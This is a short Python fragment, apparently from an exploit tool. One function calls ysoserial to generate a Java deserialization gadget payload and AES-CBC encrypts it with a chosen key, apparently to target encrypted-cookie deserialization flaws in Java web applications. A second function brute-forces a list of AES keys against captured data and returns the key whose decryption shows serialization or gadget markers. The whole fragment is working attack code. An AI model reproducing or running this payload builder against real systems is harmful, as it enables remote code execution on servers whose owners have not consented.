def encode_data(encode_data_input, AES_key, ysoserial_option):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', ysoserial_option, encode_data_input], stdout = subprocess.PIPE)
    # popen = subprocess.Popen(['java', '-jar', 'ysoserial-master-30099844c6-1.jar', ysoserial_option, encode_data_input], stdout = subprocess.PIPE)
    BS   = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode =  AES.MODE_CBC
    iv   =  uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(AES_key), mode, iv)
    file_body = pad(popen.stdout.read())
    encode_data_output = base64.b64encode(iv + encryptor.encrypt(file_body))
    return encode_data_output

def decode_data(decode_data_input, AES_key_list):
    mode =  AES.MODE_CBC
    iv   =  uuid.uuid4().bytes
    decode_data_output = AES_key = ''
    for AES_key in AES_key_list:
        try:
            decryptor = AES.new(base64.b64decode(AES_key), mode, iv)
            decode_data_output = decryptor.decrypt(base64.b64decode(decode_data_input)).decode('utf8', 'ignore')
            if 'ysoserial' in decode_data_output \
                or 'apache' in decode_data_output \
                    or 'Gadgets' in decode_data_output \
                        or 'java' in decode_data_output \
                            or 'serialize' in decode_data_output:
                return decode_data_output, AES_key
        except Exception as e:
            pass
    return '', ''

